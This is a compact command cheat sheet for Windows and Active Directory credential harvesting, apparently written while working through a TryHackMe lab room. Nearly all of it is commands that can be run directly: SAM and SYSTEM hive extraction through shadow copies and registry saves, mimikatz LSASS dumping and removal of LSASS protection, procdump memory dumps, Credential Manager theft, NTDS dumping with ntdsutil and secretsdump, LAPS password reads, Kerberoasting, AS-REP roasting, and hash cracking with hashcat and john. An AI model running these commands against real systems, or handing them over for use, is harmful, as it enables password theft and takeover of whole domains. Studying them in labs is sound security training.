### creds harvesting ###
## links ##
https://tryhackme.com/room/credharvesting


############################
## Find credential Access ##
############################
# powershell history
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
# try finding database files
# see AD files for active directory
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description


###############################
## Local Windows Credentials ##
###############################
# keylogger (see metasploit)
# SAM
type c:\Windows\System32\config\sam						# we cant access like that
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\		# same copy is not possible
meterpreter > getuid								# be administrator
meterpreter > hashdump								# use hashdump from meter instead

# Volume Shadow Copy Service
cmd.exe										# with admin rights
wmic shadowcopy call create Volume='C:\'					# create copy shadow of C: drive
vssadmin list shadows								# check if it was sucessfull
	\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1				# example of shadow copy path
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system

# Registry Hives
cmd.exe										# with admin rights
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg			# copy both sam
reg save HKLM\system C:\users\Administrator\Desktop\system-reg			# and system

# Decrypt SAM
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL


################################################
## Local Security Authority Subsystem Service ##
################################################
## (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system
## Windows system stores credentials in the LSASS process to enable users to access network resources
## the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts
# Remove protected LSASS
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords						# if error
mimikatz # !+									# import mimidrv.sys driver
mimikatz # !processprotect /process:lsass.exe /remove				# disable lsass protection

# With GUI
Open Task Manager > Details tab > lsass.exe > right-click > Create dump file	  # be admin
copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP # copy to mimikatz folder

# With sysinternals suite
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

# With mimikatz
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords						# dump cached password from lsass.exe
 

################################
## Windows Credential Manager ##
################################
## Credential Manager is Windows feature that stores logon information for websites, applications, and networks
## It contains login credentials such as usernames, passwords, and internet addresses
# With GUI
Control Panel -> User Accounts -> Credential Manager

# With cmd
# By default, Windows has two vaults, one for Web and the other one for Windows machine credentials
vaultcmd /list									# list current win vault
VaultCmd /listproperties:"Web Credentials"					# list stored creds in a vault
VaultCmd /listcreds:"Web Credentials"						# list more info about creds

# Creds Dump
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1					# powershell script
Get-WebCredentials

# RunAs
# The /savecred argument allows you to save the credentials
cmdkey /list									# enum saved creds list
    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
runas /savecred /user:thm\thm-local cmd.exe					# runas this savec user creds
whoami										# check if success

# Mimikatz
c:\Tools\Mimikatz\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::credman


#######################
## Domain Controller ##
#######################
## NTDS is a database containing all Active Directory data, including objects, attributes, credentials
## NTDS is located inC:\Windows\NTDS by default, and it is encrypted 
# Local Dumping (have administrator access to a domain controller)
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"		# dump files in temp
secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL		# extract hashes offline

# Remote Dumping (Need credentials of administrative access to a domain controller)
secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP			# dump creds
secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP			# just NTLM hashes
hashcat -m 1000 -a 0  rockyou.txt						# crack hashes if needed
john ntlm.txt --wordlist=~/perso/secu/dict/rockyou.txt --format=NT


###################################
## Local Admin Password Solution ##
###################################
## LAPS, The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime)
## of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password
## of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset
## the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd
# Enumerate LAPS
dir "C:\Program Files\LAPS\CSE"							# is LAPS installed ?
powershell
Get-Command *AdmPwd*								# available commands
Find-AdmPwdExtendedRights -Identity THMorg					# Which AD OU has all rights
	OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}	# output example
net groups "THMGroupReader"							# check member of this group
# First compromise one user of this group then
Get-AdmPwdPassword -ComputerName TARGET_MACHINE					# get password


###################
## Kerberoasting ##
###################
## must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc
## The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS)
GetUserSPNs.py -dc-ip MACHINE_IP DOMAIN/USER					# find SPN account
	http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18	# output example
GetUserSPNs.py -dc-ip MACHINE_IP DO%MAIN/USER -request-user svc-user		# request TGS for srv-user user
hashcat -m 13100 -a 0 hash.txt ~/perso/secu/dict/rockyou.txt			# try to crack the TGS
john hash.txt --wordlist=~/perso/secu/dict/rockyou.txt --format=krb5tgs


#####################
## AS-REP Roasting ##
#####################
## AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users
## whose account options have been set to "Do not require Kerberos pre-authentication"
GetNPUsers.py -dc-ip MACHINE_IP DOMAIN/ -usersfile users.txt			# check which user dont req preauth















